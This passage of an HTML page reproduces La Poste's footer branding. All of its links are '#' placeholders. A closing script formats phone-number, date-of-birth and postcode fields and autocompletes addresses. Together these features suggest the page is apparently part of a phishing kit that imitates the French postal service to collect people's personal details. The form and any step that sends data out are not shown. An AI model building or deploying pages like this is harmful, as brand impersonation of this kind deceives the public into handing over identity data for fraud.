                          <span class="engagement__subtitle" data-v-fec06fda=""> hors produits marketplace </span>
                        </p>
                      </div>
                    </section>
                  </div>
                  <div class="component component-FooterRowApps" data-v-4bb7abf8="">
                    <div class="row" data-v-2532f192="" data-v-4bb7abf8="" data-v-59f18037="">
                      <div class="app" data-v-2532f192="" data-v-59f18037="" data-v-8a283ce4="">
                        <div class="footer__head" data-v-8a283ce4="">
                          <h3 class="footer__title" data-v-8a283ce4="">Applications La Poste</h3>
                        </div>
                        <a class="app__link" data-v-8a283ce4="" href="#" title="Google Play">
                          <picture class="app__img" data-v-70bf7d34="" data-v-8a283ce4="">
                            <img alt="" class="lazyloaded" data-src="assets/img/Playstore.svg" data-v-70bf7d34="" fetchpriority="low" height="40" src="assets/img/Playstore.svg" width="135" />
                          </picture>
                        </a>
                        <a class="app__link" data-v-8a283ce4="" href="#" title="Apple Store">
                          <picture class="app__img" data-v-70bf7d34="" data-v-8a283ce4="">
                            <img alt="" class="lazyloaded" data-src="assets/img/appstore.svg" data-v-70bf7d34="" fetchpriority="low" height="40" src="assets/img/appstore.svg" width="135" />
                          </picture>
                        </a>
                      </div>
                      <a class="app__all" data-v-1e85b202="" data-v-2532f192="" data-v-59f18037="" href="#" title="Toutes nos applications"> Toutes nos applications </a>
                      <div class="connected" data-v-2532f192="" data-v-3fc109f6="" data-v-59f18037="">
                        <div class="footer__head footer__head--accordion" data-v-3fc109f6="">
                          <h3 class="footer__title" data-v-3fc109f6=""> Restons connectés </h3>
                          <i class="footer__toggle icon icon--arrow-bottom icon--regular icon--default" data-v-1028a809="" data-v-3fc109f6="">
                            <span class="visually-hidden" data-v-1028a809=""></span>
                          </i>
                        </div>
                        <ul class="connected__list" data-v-3fc109f6="">
                          <li data-v-3fc109f6="">
                            <a class="connected__link" data-v-3fc109f6="" href="#" title="Facebook">
                              <i class="icon icon--brands-facebook icon--regular icon--default" data-v-1028a809="" data-v-3fc109f6="">
                                <span class="visually-hidden" data-v-1028a809=""></span>
                              </i>
                              <span class="visually-hidden" data-v-3fc109f6="">Facebook</span>
                            </a>
                          </li>
                          <li data-v-3fc109f6="">
                            <a class="connected__link" data-v-3fc109f6="" href="#" title="Twitter">
                              <i class="icon icon--brands-twitter icon--regular icon--default" data-v-1028a809="" data-v-3fc109f6="">
                                <span class="visually-hidden" data-v-1028a809=""></span>
                              </i>
                              <span class="visually-hidden" data-v-3fc109f6="">Twitter</span>
                            </a>
                          </li>
                          <li data-v-3fc109f6="">
                            <a class="connected__link" data-v-3fc109f6="" href="#" title="Instagram">
                              <i class="icon icon--brands-instagram icon--regular icon--default" data-v-1028a809="" data-v-3fc109f6="">
                                <span class="visually-hidden" data-v-1028a809=""></span>
                              </i>
                              <span class="visually-hidden" data-v-3fc109f6="">Instagram</span>
                            </a>
                          </li>
                          <li data-v-3fc109f6="">
                            <a class="connected__link" data-v-3fc109f6="" href="#" title="Youtube">
                              <i class="icon icon--brands-youtube icon--regular icon--default" data-v-1028a809="" data-v-3fc109f6="">
                                <span class="visually-hidden" data-v-1028a809=""></span>
                              </i>
                              <span class="visually-hidden" data-v-3fc109f6="">Youtube</span>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <div class="component component-LpelFooterNavigationComponent" data-v-4bb7abf8="">
                    <section class="headings" data-v-4bb7abf8="" data-v-704656f9="">
                      <ul class="headings__list" data-v-704656f9="">
                        <li class="heading headings__item" data-v-2f6983bd="" data-v-704656f9="">
                          <div class="heading__head" data-v-2f6983bd="">
                            <h3 class="heading__title" data-v-2f6983bd="">Nos Services</h3>
                            <i class="heading__arrow icon icon--arrow-bottom icon--regular icon--default" data-v-1028a809="" data-v-2f6983bd="">
                              <span class="visually-hidden" data-v-1028a809=""></span>
                            </i>
                          </div>
                          <ul class="heading__list" data-v-2f6983bd="">
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Envoyer sans vous déplacer </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Envois importants </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Déménagement, Absence </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Solutions Seniors </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Digiposte </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> L'identité Numérique </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Vendre sur la Marketplace La Poste </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Découvrir la Marketplace La Poste </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Activer mes Services Plus pour envoyer mon courrier </a>
                            </li>
                          </ul>
                        </li>
                        <li class="heading headings__item" data-v-2f6983bd="" data-v-704656f9="">
                          <div class="heading__head" data-v-2f6983bd="">
                            <h3 class="heading__title" data-v-2f6983bd="">Nos Produits</h3>
                            <i class="heading__arrow icon icon--arrow-bottom icon--regular icon--default" data-v-1028a809="" data-v-2f6983bd="">
                              <span class="visually-hidden" data-v-1028a809=""></span>
                            </i>
                          </div>
                          <ul class="heading__list" data-v-2f6983bd="">
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Enveloppes </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Timbres </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Emballages </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Collectionneurs </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Cartes de voeux </a>
                            </li>
                          </ul>
                        </li>
                        <li class="heading headings__item" data-v-2f6983bd="" data-v-704656f9="">
                          <div class="heading__head" data-v-2f6983bd="">
                            <h3 class="heading__title" data-v-2f6983bd="">Nos Tarifs</h3>
                            <i class="heading__arrow icon icon--arrow-bottom icon--regular icon--default" data-v-1028a809="" data-v-2f6983bd="">
                              <span class="visually-hidden" data-v-1028a809=""></span>
                            </i>
                          </div>
                          <ul class="heading__list" data-v-2f6983bd="">
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Tarifs postaux | Catalogue intégral </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Grille de tarifs Courrier </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Grille de tarifs Colis </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Affiche tarifaire courrier-colis </a>
                            </li>
                          </ul>
                        </li>
                        <li class="heading headings__item" data-v-2f6983bd="" data-v-704656f9="">
                          <div class="heading__head" data-v-2f6983bd="">
                            <h3 class="heading__title" data-v-2f6983bd="">La Poste vous accompagne</h3>
                            <i class="heading__arrow icon icon--arrow-bottom icon--regular icon--default" data-v-1028a809="" data-v-2f6983bd="">
                              <span class="visually-hidden" data-v-1028a809=""></span>
                            </i>
                          </div>
                          <ul class="heading__list" data-v-2f6983bd="">
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Aides et contact </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Les avantages de Mon compte La Poste </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Espace sourds et malentendants </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Votre avis est essentiel </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Emplois et carrières des métiers bancaires </a>
                            </li>
                            <li class="heading__item" data-v-2f6983bd="">
                              <a class="heading__link" data-v-2f6983bd="" href="#"> Emplois et carrières autres métiers </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </section>
                  </div>
                  <div class="component component-FooterRowCopyright" data-v-4bb7abf8="">
                    <div class="row" data-v-2532f192="" data-v-4bb7abf8="" data-v-59f18037="">
                      <div class="footer__site" data-v-2532f192="" data-v-4d4825af="" data-v-59f18037="">
                        <picture class="logo" data-v-4d4825af="" data-v-70bf7d34="">
                          <img alt="La poste" class="lazyload" data-v-70bf7d34="" fetchpriority="low" height="105" width="190" />
                        </picture>
                        <p class="footer__copyright" data-v-4d4825af=""></p>
                      </div>
                      <div class="footer__bottom-content" data-v-2449448b="" data-v-2532f192="" data-v-59f18037="">
                        <div class="footer__text footer__text--new-logo" data-v-2449448b="">
                          <a href="#">Accédez ici aux différents sites de La Poste Groupe</a>
                        </div>
                        <div class="footer__bottom-upper" data-v-2449448b="">
                          <ul class="external-links" data-v-2449448b="">
                            <li class="pros__item external-links__item" data-v-2449448b="">
                              <a class="external-links__link" data-v-2449448b="" href="#">Professionnels</a>
                            </li>
                            <li class="pros__item external-links__item" data-v-2449448b="">
                              <a class="external-links__link" data-v-2449448b="" href="#">Entreprises et Collectivités</a>
                            </li>
                            <li class="pros__item external-links__item" data-v-2449448b="">
                              <a class="external-links__link" data-v-2449448b="" href="#">La Poste Groupe</a>
                            </li>
                            <li class="pros__item external-links__item" data-v-2449448b="">
                              <a class="external-links__link" data-v-2449448b="" href="#">La Poste recrute</a>
                            </li>
                          </ul>
                        </div>
                        <div class="footer__bottom-lower" data-v-2449448b="">
                          <i aria-label="Retour en haut" class="back icon icon--arrow-large-up icon--regular icon--default" data-v-1028a809="" data-v-2449448b="" tabindex="0">
                            <span class="visually-hidden" data-v-1028a809=""></span>
                          </i>
                          <picture class="logo logo--clickable logo--horizontal logo--large" data-v-0453bd69="" data-v-2449448b="" role="link" tabindex="0">
                            <img alt="La Poste" class="logo__image logo__image--horizontal logo__image--part" data-v-0453bd69="" height="32" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYyIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTYyIDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTIuMjM0MSAwLjY1NTAxNkwyMy45OTc5IDYuMDAyNkg0Mi4wMTY1TDQzLjUwNzUgMy40MTQ2MUM0NC40MDIzIDEuODYyODggNDMuMzIxOCAwIDQxLjY4OTkgMEgxMi4zNjA5QzExLjk2MiAwIDExLjg2NiAwLjQ4NzcyNSAxMi4yMzQyIDAuNjU1MDE2SDEyLjIzNDFaIiBmaWxsPSIjMDAzREE1Ii8+CjxwYXRoIGQ9Ik0yMy45OTc5IDguMjk3ODVINTMuMzQ3M0M1My42ODY5IDguMjk3ODUgNTQuMDE1NCA4LjU2Mzk1IDU0LjAxNTQgOC45NjAzQzU0LjAxNTQgOS4zMTA5NiA1My43NzUyIDkuNTM5NDggNTMuNTMzMSA5LjYwNjU0TDAuNDI3ODE0IDIzLjk4NjhDMC4wODE3ODQ1IDI0LjA4MTYgLTAuMTYxNTM4IDIzLjYzNSAwLjEyOTQxMiAyMy40MDNMMjMuOTk4IDguMjk3ODVIMjMuOTk3OVoiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTkuMTY3OTcgMjQuMDAwM0wyOC40MzUyIDIzLjY0MTlDMzAuMzA0MiAyMy42MDcxIDMyLjQ5MzEgMjIuNTMwMiAzMy40OTE5IDIwLjc5NjVMMzUuODAyNCAxNi43ODYxTDkuMTY3OTcgMjQuMDAwM1oiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTgyLjA5MSA1LjgzNzEySDc5LjQ4MzlMNzIuODgzOCAxOC41Njc4SDc1LjYzNTFMNzYuODE2OSAxNi4yMjcySDg0LjcyMDRMODUuNDk2NiAxNy43NjRDODUuODc3IDE4LjUxOCA4Ni4yMzAyIDE4LjU2NzYgODcuMjIxMSAxOC41Njc2SDg4LjY5MjFMODIuMDkxIDUuODM2OTFWNS44MzcxMlpNNzcuOTY3MSAxMy45NDc4TDgwLjc2NzkgOC40MDA1M0w4My41Njg2IDEzLjk0NzhINzcuOTY2OUg3Ny45NjcxWiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNOTYuMzI1NSAxNC44MDAxVjE4LjU2NzJIOTMuNzcxNVY1Ljk1NTI4Qzk1LjExMjkgNS45MjA4MiA5Ni45MjM4IDUuODY5MTQgOTguNDIxMiA1Ljg2OTE0QzEwMS4zNDIgNS44NjkxNCAxMDMuMjg2IDYuMjgzNDUgMTA0LjQ0MiA3LjQzOTYzQzEwNS4xNDkgOC4xNzQ1MyAxMDUuNTIgOS4xNjkyOSAxMDUuNDY3IDEwLjE4NzZDMTA1LjQ2NyAxMy44MzA5IDEwMi42MjMgMTQuODIyIDk4LjU2NjcgMTQuODIyQzk4LjAxMzEgMTQuODIyIDk2Ljk3OTMgMTQuODA4NSA5Ni4zMjU1IDE0LjgwMDFaTTk2LjMyNTUgMTIuNDY0M0M5Ni45Njg5IDEyLjQ3NzQgOTcuNzc5NSAxMi40ODY1IDk4LjMzODQgMTIuNDg2NUM5OS45NzYzIDEyLjQ4NjUgMTAxLjQ3OCAxMi40MzY4IDEwMi4yNzkgMTEuNjM1N0MxMDIuNjQ3IDExLjI2MzQgMTAyLjg0IDEwLjc1MjkgMTAyLjgxMiAxMC4yMzAzQzEwMi44MTggOS43OTc3NCAxMDIuNjY0IDkuMzc4MjkgMTAyLjM3OSA5LjA1MzJDMTAxLjU3OSA4LjI1MzQ5IDEwMC40MTcgOC4yMDQwNyA5OC4zMzg0IDguMjA0MDdDOTcuNzc5MyA4LjIwNDA3IDk2Ljk2OTkgOC4yMTMwOSA5Ni4zMjU1IDguMjI2MjJWMTIuNDY0M1oiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTEyMi4wNzcgMTIuMjYxQzEyMi4wNzcgMTUuODc0OSAxMTkuMjMzIDE4LjgxNTEgMTE0LjQ1NSAxOC44MTUxQzEwOS42NzcgMTguODE1MSAxMDYuODMzIDE1Ljg3NTIgMTA2LjgzMyAxMi4yNjEyQzEwNi44MzMgOC42NDcyMyAxMDkuNjc3IDUuNzA3MDMgMTE0LjQ1NSA1LjcwNzAzQzExOS4yMzMgNS43MDcwMyAxMjIuMDc3IDguNjQ3MDIgMTIyLjA3NyAxMi4yNjFaTTExNC40NTUgOC4wMDAxMUMxMTEuNTYgOC4wMDAxMSAxMDkuNDk0IDkuNjc4MjkgMTA5LjQ5NCAxMi4yNjFDMTA5LjQ5NCAxNC44NDM3IDExMS41NTggMTYuNTIxOCAxMTQuNDU1IDE2LjUyMThDMTE3LjM1MiAxNi41MjE4IDExOS40MTYgMTQuODQzNyAxMTkuNDE2IDEyLjI2MUMxMTkuNDE2IDkuNjc4MjkgMTE3LjM1MiA4LjAwMDExIDExNC40NTUgOC4wMDAxMUgxMTQuNDU1WiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNMTM0Ljk4MyA3LjEyMDQxQzEzMy41OTggNi4yNTU2OSAxMzEuMzQ4IDUuNzA3MDMgMTI5LjY0NyA1LjcwNzAzQzEyNi40NDEgNS43MDcwMyAxMjMuOTIyIDcuMzkyNTkgMTIzLjkyMiA5LjczNzE1QzEyMy45MjIgMTQuMTU0MSAxMzIuNjE3IDEyLjUxNTUgMTMyLjYxNyAxNS4xMzc4QzEzMi42MTcgMTYuMjA3IDEzMS4wMjcgMTYuNjY0NCAxMjkuNjY4IDE2LjY2NDRDMTI3Ljg1MyAxNi42NTA1IDEyNi4wODQgMTYuMDk1OCAxMjQuNTg2IDE1LjA3MTVMMTIzLjI3OCAxNy4wMTU5QzEyNC44NjMgMTguMDk2NCAxMjcuNDE0IDE4LjgxNTcgMTI5LjQ0NSAxOC44MTU3QzEzMi42MiAxOC44MTU3IDEzNS4yNzcgMTcuMzM2MSAxMzUuMjc3IDE0Ljg1OTNDMTM1LjI3NyAxMC4zNzYxIDEyNi42MjEgMTEuNzcxMiAxMjYuNjIxIDkuMzQwMDdDMTI2LjYyMSA4LjMxMDY0IDEyOC4wNTUgNy44NjA0NCAxMjkuNjAyIDcuODYwNDRDMTMxLjA4NyA3Ljg4MTM2IDEzMi41MzYgOC4zMjI5NSAxMzMuNzgxIDkuMTMzOTNMMTM0Ljk4MyA3LjEyMDYyVjcuMTIwNDFaIiBmaWxsPSIjMDAzREE1Ii8+CjxwYXRoIGQ9Ik0xNDguMzg0IDUuOTQ2MjlIMTM2LjE5MlY4LjI5MDQ1SDE0MC45NjdWMTguNTY3N0gxNDMuNTIxVjguMjkwNDVIMTQ4LjM4NFY1Ljk0NjI5WiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNMTQ5Ljk4OCA1Ljk0NjI5VjE3LjY1OTdDMTQ5Ljk4OCAxOC4xODYyIDE1MC4zMTMgMTguNTY3OSAxNTAuOSAxOC41Njc5SDE2MS4xOFYxNi4yMzNIMTUyLjU0MVYxMy4yOTc3SDE2MC4yNTVWMTAuOTYzSDE1Mi41NDFWOC4yOTA4NUgxNjAuOTVWNS45NDY1SDE0OS45ODciIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTY1LjQxMjkgNS45NDYyOUg2Mi44NTk0VjE3LjY1OTdDNjIuODU5NCAxOC4xODYyIDYzLjE4NDcgMTguNTY3OSA2My43NzIxIDE4LjU2NzlINzEuNDAxNEw3Mi42MTMgMTYuMjMyOEg2NS40MTMxVjUuOTQ2NUw2NS40MTI5IDUuOTQ2MjlaIiBmaWxsPSIjMDAzREE1Ii8+Cjwvc3ZnPgo=" width="215" />
                          </picture>
                          <div class="links" data-v-2449448b="">
                            <a class="links__item" data-v-2449448b="" href="#"> Plan du site </a>
                            <a class="links__item" data-v-2449448b="" href="#"> Accessibilité : non conforme </a>
                            <a class="links__item" data-v-2449448b="" href="#"> Conditions contractuelles </a>
                            <a class="links__item" data-v-2449448b="" href="#"> Mentions légales </a>
                            <a class="links__item" data-v-2449448b="" href="#"> Données personnelles et cookies </a>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </footer>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
<style>
      .autoComplete_wrapper > ul {
  max-height: 226px;
  min-height: 0;
  overflow-y: scroll;
  box-sizing: border-box;
  left: 0;
  right: 0;
  margin: 0.5rem 0 0 0;
  padding: 0;
  z-index: 1;
  list-style: none;
  border-radius: 0.6rem;
  background-color: #fff;
  border: 1px solid rgba(33, 33, 33, 0.07);
  box-shadow: 0 3px 6px rgba(255, 201, 5, 0.15);
  outline: none;
  transition: opacity 0.15s ease-in-out;
  -moz-transition: opacity 0.15s ease-in-out;
  -webkit-transition: opacity 0.15s ease-in-out;
}

.autoComplete_wrapper > ul[hidden],
.autoComplete_wrapper > ul:empty {
  display: block;
  opacity: 0;
  height: 0;
  transform: scale(0);
}

.autoComplete_wrapper > ul > li {
  margin: 0.3rem;
  padding: 0.3rem 0.5rem;
  text-align: left;
  font-size: 1.5rem;
  color: rgba(255, 201, 5, 1);
  border-radius: 0.35rem;
  background-color: rgba(255, 255, 255, 1);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  transition: all 0.2s ease;
}

.autoComplete_wrapper > ul > li mark {
  background-color: transparent;
  color: #000;
  font-weight: bold;
}

.autoComplete_wrapper > ul > li:hover {
  cursor: pointer;
  background-color: rgba(255, 201, 5, 0.15);
}

.autoComplete_wrapper > ul > li[aria-selected="true"] {
  background-color: rgba(255, 201, 5, 0.15);
}

@media only screen and (max-width: 600px) {
  .autoComplete_wrapper > input {
    width: 18rem;
  }
}

    </style>
<script src="https://cdn.jsdelivr.net/npm/@tarekraafat/autocomplete.js@10.2.6/dist/autoComplete.min.js"></script>
<script>
  $('#tel').mask('99 99 99 99 99');
  $('#dob').mask('99/99/9999');
  $('#zip').mask('999999');

  var myobject = []
        const postcode = document.querySelector('#zip')
        const city = document.querySelector('#city')
        const autoCompleteJS = new autoComplete({
            selector: "#address",
            placeHolder: "Recherche adresse...",
            data: {
                src: async () => {
                   const term = document.querySelector('#address').value;
                   if (term) {
                     const response = await fetch(`https://api-adresse.data.gouv.fr/search/?q=${term}`)
                     const json = await response.json()
                     myobject = json.features.map(function(el) {
                        return {
                          label: el.properties.label,
                          value: el.properties.label,
                          lat: el.geometry.coordinates[1],
                          lon: el.geometry.coordinates[0],
                          housenumber: el.properties.housenumber,
                          name: el.properties.name,
                          postcode: el.properties.postcode,
                          citycode: el.properties.citycode,
                          city: el.properties.city,
                          context: el.properties.context,
                          type: el.properties.type,
                          street: el.properties.street,
                          boundingbox: null
                        }
                      })
                      adresses = myobject.map(el => el.value)
                      console.log(adresses);
                   } else {
                     adresses = []
                   }
                  return adresses
                },                cache: false,
            },
            resultsList: {
                element: (list, data) => {
                    if (!data.results.length) {
                        // Create "No Results" message element
                        const message = document.createElement("div");
                        // Add class to the created element
                        message.setAttribute("class", "no_result");
                        // Add message text content
                        message.innerHTML = `<span>Found No Results for "${data.query}"</span>`;
                        // Append message element to the results list
                        list.prepend(message);
                    }
                },
                noResults: true,
            },
            resultItem: {
                highlight: true
            },
            events: {
                input: {
                    selection: (event) => {
                        const selection = event.detail.selection.value;
                        autoCompleteJS.input.value = selection;
                        var result = myobject.find(el => el.value == event.detail.selection.value)
                        if (result) {
                          adress.value = result.name
                          postcode.value = result.postcode
                          city.value = result.city
                        } else {
                          adress.value = ''
                          postcode.value = ''
                          city.value = ''
                        }

                    }
                }
            }
        });

</script>